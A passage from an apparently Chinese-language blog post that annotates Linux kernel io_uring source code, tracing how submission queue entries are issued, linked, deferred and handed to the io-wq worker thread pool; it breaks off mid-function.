<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_queue_sqe</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req)</span></span><br><span class="line">	__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = io_issue_sqe(req, IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We async punt it if the file wasn&#x27;t marked NOWAIT, or if the file</span></span><br><span class="line"><span class="comment">	 * doesn&#x27;t support non-blocking read/write attempts</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (likely(!ret))</span><br><span class="line">		io_arm_ltimeout(req);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		io_queue_async(req, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_issue_sqe</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req, <span class="type">unsigned</span> <span class="type">int</span> issue_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_issue_def</span> *<span class="title">def</span> =</span> &amp;io_issue_defs[req-&gt;opcode];</span><br><span class="line">	<span class="comment">// 根据op_code 查看请求def</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">creds</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!io_assign_file(req, def, issue_flags)))</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line">	<span class="comment">// 为请求分配文件描述符</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely((req-&gt;flags &amp; REQ_F_CREDS) &amp;&amp; req-&gt;creds != current_cred()))</span><br><span class="line">		creds = override_creds(req-&gt;creds);</span><br><span class="line">	<span class="comment">// 备份和恢复请求执行线程的安全凭证</span></span><br><span class="line">	<span class="keyword">if</span> (!def-&gt;audit_skip)</span><br><span class="line">		audit_uring_entry(req-&gt;opcode);</span><br><span class="line">		<span class="comment">// 调用audit跟踪提交事件</span></span><br><span class="line"></span><br><span class="line">	ret = def-&gt;issue(req, issue_flags);</span><br><span class="line">	<span class="comment">// 调用def-&gt;issue执行请求</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!def-&gt;audit_skip)</span><br><span class="line">		audit_uring_exit(!ret, ret);</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (creds)</span><br><span class="line">		revert_creds(creds);</span><br><span class="line">	<span class="comment">// 恢复凭证</span></span><br><span class="line">	<span class="keyword">if</span> (ret == IOU_OK) &#123;</span><br><span class="line">		<span class="keyword">if</span> (issue_flags &amp; IO_URING_F_COMPLETE_DEFER)</span><br><span class="line">		<span class="comment">// 如果成功并且标记了延迟完成,注册延迟完成回调</span></span><br><span class="line">			io_req_complete_defer(req);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			io_req_complete_post(req, issue_flags);</span><br><span class="line">			<span class="comment">//  否则直接提交完成 </span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != IOU_ISSUE_SKIP_COMPLETE)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If the op doesn&#x27;t have a file, we&#x27;re not polling for it */</span></span><br><span class="line">	<span class="keyword">if</span> ((req-&gt;ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp; def-&gt;iopoll_queue)</span><br><span class="line">		io_iopoll_req_issued(req, issue_flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="io-get-sqe-重要"><code>io_get_sqe</code> |  重要</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">io_get_sqe</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">const</span> <span class="keyword">struct</span> io_uring_sqe **sqe)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> mask = ctx-&gt;sq_entries - <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> head = ctx-&gt;cached_sq_head++ &amp; mask;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) &#123;</span><br><span class="line">		head = READ_ONCE(ctx-&gt;sq_array[head]);</span><br><span class="line">		<span class="comment">// 如果没有设置NOSQARRAY 直接从array读</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(head &gt;= ctx-&gt;sq_entries)) &#123;</span><br><span class="line">			<span class="comment">// 丢弃无效 entries</span></span><br><span class="line">			spin_lock(&amp;ctx-&gt;completion_lock);</span><br><span class="line">			ctx-&gt;cq_extra--;</span><br><span class="line">			spin_unlock(&amp;ctx-&gt;completion_lock);</span><br><span class="line">			WRITE_ONCE(ctx-&gt;rings-&gt;sq_dropped,</span><br><span class="line">				   READ_ONCE(ctx-&gt;rings-&gt;sq_dropped) + <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">		head &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	*sqe = &amp;ctx-&gt;sq_sqes[head];</span><br><span class="line">	<span class="comment">// 从 sq_sqes 取一个sqe </span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="io-submit-sqe-同步与异步的请求执行"><code>io_submit_sqe</code> | 同步与异步的请求执行</h3>
<p>我们首先回到 <code>io_submit_sqe</code></p>
<p>我们注意到, 如果存在 LINK 标记, 只是将这个req添加到链上,  而没有 <code>io_queue_sqe</code>.</p>
<p>如果前一个请求有 LINK 标记, 此时没有, 也只是将请求加入链中后, 清空 head.  此时调用的是 <code>io_queue_sqe(NULL)</code></p>
<p>综上, 对于link, 并没有直接处理.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">if</span> (unlikely(link-&gt;head)) &#123;</span><br><span class="line">	<span class="comment">// 如果链表已经有了一个head 请求, 意味着之前sqe 有 `IOSQE_IO_LINK` 标志</span></span><br><span class="line">		ret = io_req_prep_async(req);</span><br><span class="line">		<span class="comment">// 准备异步提交状态</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(ret))</span><br><span class="line">			<span class="keyword">return</span> io_submit_fail_init(sqe, req, ret);</span><br><span class="line">			</span><br><span class="line">		trace_io_uring_link(req, link-&gt;head);</span><br><span class="line">		link-&gt;last-&gt;link = req;</span><br><span class="line">		link-&gt;last = req;</span><br><span class="line">		<span class="comment">// 将本项挂载到链表</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="comment">// 如果此项没有 LINK 标志, 清空 链表</span></span><br><span class="line">		<span class="comment">/* last request of the link, flush it */</span></span><br><span class="line">		req = link-&gt;head;</span><br><span class="line">		link-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (req-&gt;flags &amp; (REQ_F_FORCE_ASYNC | REQ_F_FAIL))</span><br><span class="line">			<span class="keyword">goto</span> fallback;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(req-&gt;flags &amp; (IO_REQ_LINK_FLAGS |</span><br><span class="line">					  REQ_F_FORCE_ASYNC | REQ_F_FAIL))) &#123;</span><br><span class="line">		<span class="comment">// 如果之前的任务没有LINK 标记, 但此任务有, 给链表添加一个头</span></span><br><span class="line">		<span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS) &#123;</span><br><span class="line">			link-&gt;head = req;</span><br><span class="line">			link-&gt;last = req;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fallback:  </span><br><span class="line">			<span class="comment">// 加入降级提交fallback队列</span></span><br><span class="line">			io_queue_sqe_fallback(req);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 加入普通提交队列</span></span><br><span class="line">	io_queue_sqe(req);</span><br></pre></td></tr></table></figure>
<p>再次重回 <code>io_queue_sqe</code> 函数, 我们发现其在调用  <code>io_issue_sqe</code> 时设置了这样两个标志  <code>IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER</code>, 字面意义上理解, 就是非阻塞与延迟完成.</p>
<p>首先为什么要非阻塞呢?</p>
<p>让我们往前回想, 发现, 在 IOPOLL 模式下,  <code>io_uring_enter</code> 也是调用了 <code>io_submit_sqes</code> , 最终也会调用到此函数, 所以如果这个函数阻塞了, IOPOLL模式下, 用户进程实际上也是阻塞的, 也就不符合异步的初衷了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_queue_sqe</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req)</span></span><br><span class="line">	__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = io_issue_sqe(req, IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We async punt it if the file wasn&#x27;t marked NOWAIT, or if the file</span></span><br><span class="line"><span class="comment">	 * doesn&#x27;t support non-blocking read/write attempts</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (likely(!ret))</span><br><span class="line">		io_arm_ltimeout(req);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		io_queue_async(req, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来再进入 <code>io_issue_sqe</code> , 其中使用了一个虚表调用处理函数, 并且之前的flag也作为参数传入了.</p>
<p>而我们知道, 如read, write等很多操作, 都是阻塞的, 不能 <code>NOBLOCK</code>  , 因此, 这个执行只是一个尝试执行, 实际上并没有真正完成请求</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = def-&gt;issue(req, issue_flags);</span><br><span class="line"><span class="comment">// 调用def-&gt;issue执行请求</span></span><br></pre></td></tr></table></figure>
<p>接下来我们注意到, 在 <code>io_queue_sqe</code> 调用此函数时, 设置了 <code>IO_URING_F_COMPLETE_DEFER</code> 标志</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ret == IOU_OK) &#123;</span><br><span class="line">	<span class="keyword">if</span> (issue_flags &amp; IO_URING_F_COMPLETE_DEFER)</span><br><span class="line">	<span class="comment">// 如果成功并且标记了延迟完成,注册延迟完成回调</span></span><br><span class="line">		io_req_complete_defer(req);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		io_req_complete_post(req, issue_flags);</span><br><span class="line">		<span class="comment">//  否则直接提交完成 </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != IOU_ISSUE_SKIP_COMPLETE)</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure>
<p>继续进入 <code>io_req_complete_defer</code>  发现实际上就是将请求插入插入链表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_req_complete_defer</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req)</span></span><br><span class="line">	__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_submit_state</span> *<span class="title">state</span> =</span> &amp;req-&gt;ctx-&gt;submit_state;</span><br><span class="line"></span><br><span class="line">	lockdep_assert_held(&amp;req-&gt;ctx-&gt;uring_lock);</span><br><span class="line"></span><br><span class="line">	wq_list_add_tail(&amp;req-&gt;comp_list, &amp;state-&gt;compl_reqs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这也没有完成请求.</p>
<p>那么真正完成请求是在哪? 让我们继续分析</p>
<h4 id="io-queue-async"><code>io_queue_async</code></h4>
<p>在 <code>io_issue_sqe</code>  返回后,  <code>io_queue_sqe</code> 继续调用了此函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_queue_async</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req, <span class="type">int</span> ret)</span></span><br><span class="line">	__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">linked_timeout</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret != -EAGAIN || (req-&gt;flags &amp; REQ_F_NOWAIT)) &#123;</span><br><span class="line">		io_req_defer_failed(req, ret);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;<span class="comment">// 如果请求是不可等待的必须立马完成的, 就不能推迟</span></span><br><span class="line"></span><br><span class="line">	linked_timeout = io_prep_linked_timeout(req);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (io_arm_poll_handler(req, <span class="number">0</span>)) &#123;</span><br><span class="line">	<span class="comment">// 这里调用了一个 论询问 handler, 确定 请求的类型</span></span><br><span class="line">	<span class="keyword">case</span> IO_APOLL_READY:</span><br><span class="line">	<span class="comment">// 如果已经可以完成了</span></span><br><span class="line">		io_kbuf_recycle(req, <span class="number">0</span>);</span><br><span class="line">		io_req_task_queue(req);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> IO_APOLL_ABORTED:</span><br><span class="line">	<span class="comment">// 如果终止了</span></span><br><span class="line">		io_kbuf_recycle(req, <span class="number">0</span>);</span><br><span class="line">		io_queue_iowq(req, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> IO_APOLL_OK:</span><br><span class="line">	<span class="comment">// 如果已经完成了</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (linked_timeout)</span><br><span class="line">		io_queue_linked_timeout(linked_timeout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要到, 当为 <code>IO_APOLL_ABORTED</code> 时,  调用了 <code>io_queue_iowq</code></p>
<p>这里先介绍一下 kernel <a target="_blank" rel="noopener" href="https://docs.kernel.org/core-api/workqueue.html">work queue</a> 机制,  workqueue 是一个内核线程池, 当有任务来时, 就从线程池中寻找一个线程运行, 这里就是将请求放入线程池的队列中</p>
<p>这里可能会有读者有疑问, 那线程池是什么时候创建的呢? 其实是在被笔者跳过的 <code>ctx</code> 的创建过程中// #TODO  由于过于繁杂, 笔者暂时没有分析</p>
<h3 id="io-queue-iowq-任务处理线程池"><code>io_queue_iowq</code> | 任务处理线程池</h3>
<p>这一部分也比较重要, 首先是 <code>io_prep_async_link(req)</code>  , 为在一条链上的请求创建 work 结构, 用来放入队列中, 并且 通过  <code>io_wq_enqueue</code> 将其加入线程池队列</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">io_queue_iowq</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req, <span class="keyword">struct</span> io_tw_state *ts_dont_use)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">link</span> =</span> io_prep_linked_timeout(req);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span> =</span> req-&gt;task-&gt;io_uring;</span><br><span class="line"></span><br><span class="line">	BUG_ON(!tctx);</span><br><span class="line">	BUG_ON(!tctx-&gt;io_wq);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* init -&gt;work of the whole link before punting */</span></span><br><span class="line">	io_prep_async_link(req);</span><br><span class="line">	<span class="comment">// 为链少的每一个 req 准备work结构</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Not expected to happen, but if we do have a bug where this _can_</span></span><br><span class="line"><span class="comment">	 * happen, catch it here and ensure the request is marked as</span></span><br><span class="line"><span class="comment">	 * canceled. That will make io-wq go through the usual work cancel</span></span><br><span class="line"><span class="comment">	 * procedure rather than attempt to run this request (or create a new</span></span><br><span class="line"><span class="comment">	 * worker for it).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (WARN_ON_ONCE(!same_thread_group(req-&gt;task, current)))</span><br><span class="line">		req-&gt;work.flags |= IO_WQ_WORK_CANCEL;</span><br><span class="line"></span><br><span class="line">	trace_io_uring_queue_async_work(req, io_wq_is_hashed(&amp;req-&gt;work));</span><br><span class="line">	io_wq_enqueue(tctx-&gt;io_wq, &amp;req-&gt;work);</span><br><span class="line">	<span class="keyword">if</span> (link)</span><br><span class="line">		io_queue_linked_timeout(link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为什么要用work结构而不是 <code>io_kiocb</code> 结构呢, work结构是 <code>io_kiocb</code> 的一个成员, 通过指针减去偏移就可以得到 <code>io_kiocb</code> 的指针, 与此通过, 由于work结构更小, 创建临时结构体时占用空间更小</p>
<h4 id="io-wq-enqueue"><code>io_wq_enqueue</code></h4>
<p><code>io_wq_enqueue</code>  是将任务加入 <code>io_wq</code> 线程池的任务队列中.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">io_wq_enqueue</span><span class="params">(<span class="keyword">struct</span> io_wq *wq, <span class="keyword">struct</span> io_wq_work *work)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_wq_acct</span> *<span class="title">acct</span> =</span> io_work_get_acct(wq, work);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_cb_cancel_data</span> <span class="title">match</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> work_flags = work-&gt;flags;</span><br><span class="line">	<span class="type">bool</span> do_create;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If io-wq is exiting for this task, or if the request has explicitly</span></span><br><span class="line"><span class="comment">	 * been marked as one that should not get executed, cancel it here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state) ||</span><br><span class="line">	    (work-&gt;flags &amp; IO_WQ_WORK_CANCEL)) &#123;</span><br><span class="line">		io_run_cancel(work, wq);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 如果需要取消 work  </span></span><br><span class="line">	raw_spin_lock(&amp;acct-&gt;lock);</span><br><span class="line">	io_wq_insert_work(wq, work);</span><br><span class="line">	clear_bit(IO_ACCT_STALLED_BIT, &amp;acct-&gt;flags);</span><br><span class="line">	raw_spin_unlock(&amp;acct-&gt;lock);</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	do_create = !io_wq_activate_free_worker(wq, acct);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="comment">// 是否需要创建worker</span></span><br><span class="line">	<span class="keyword">if</span> (do_create &amp;&amp; ((work_flags &amp; IO_WQ_WORK_CONCURRENT) ||</span><br><span class="line">	    !<span class="type">atomic_read</span>(&amp;acct-&gt;nr_running))) &#123;</span><br><span class="line">		<span class="type">bool</span> did_create;</span><br><span class="line">		</span><br><span class="line">		did_create = io_wq_create_worker(wq, acct);</span><br><span class="line">		<span class="comment">// 创建worker</span></span><br><span class="line">		<span class="keyword">if</span> (likely(did_create))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		<span class="comment">// 如果已经创建了, 直接返回</span></span><br><span class="line">		raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line">		<span class="keyword">if</span> (acct-&gt;nr_workers) &#123;</span><br><span class="line">			raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* fatal condition, failed to create the first worker */</span></span><br><span class="line">		match.fn		= io_wq_work_match_item,</span><br><span class="line">		match.data		= work,</span><br><span class="line">		match.cancel_all	= <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">		io_acct_cancel_pending_work(wq, acct, &amp;match);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上调用了 <code>io_wq_create_worker</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">io_wq_create_worker</span><span class="params">(<span class="keyword">struct</span> io_wq *wq, <span class="keyword">struct</span> io_wq_acct *acct)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!acct-&gt;max_workers))</span><br><span class="line">		pr_warn_once(<span class="string">&quot;io-wq is not configured for unbound workers&quot;</span>);</span><br><span class="line"></span><br><span class="line">	raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line">	<span class="keyword">if</span> (acct-&gt;nr_workers &gt;= acct-&gt;max_workers) &#123;</span><br><span class="line">		raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 如果已经有上限个 worker了</span></span><br><span class="line">	<span class="comment">// 直接返回</span></span><br><span class="line">	</span><br><span class="line">	acct-&gt;nr_workers++;</span><br><span class="line">	raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line">	